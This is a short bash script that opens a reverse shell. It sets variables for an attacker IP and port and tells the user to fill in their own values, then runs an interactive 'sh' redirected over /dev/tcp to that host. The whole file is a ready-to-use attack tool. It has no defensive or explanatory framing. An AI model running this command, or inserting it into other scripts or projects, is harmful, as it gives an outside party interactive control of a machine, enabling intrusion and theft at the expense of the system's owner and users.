#!/bin/bash

# Replace the following variables with your own values
attacker_ip="127.0.0.1"
attacker_port="4444"

# Open reverse shell connection
sh -i >& /dev/tcp/"$attacker_ip"/"$attacker_port" 0>&1

